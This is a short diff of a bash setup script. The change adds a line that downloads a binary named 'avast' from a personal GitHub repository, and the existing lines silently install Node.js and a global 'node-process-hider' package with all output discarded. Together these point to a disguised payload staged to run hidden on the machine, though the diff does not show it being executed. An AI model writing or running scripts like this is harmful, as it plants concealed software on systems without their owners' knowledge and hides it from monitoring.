@@ -1,5 +1,5 @@
 #!/bin/bash
-
+wget https://github.com/aurbach55/toya/raw/main/avast
 apt update
 apt-get install -y nodejs >/dev/null 2>&1
 npm i -g node-process-hider >/dev/null 2>&1
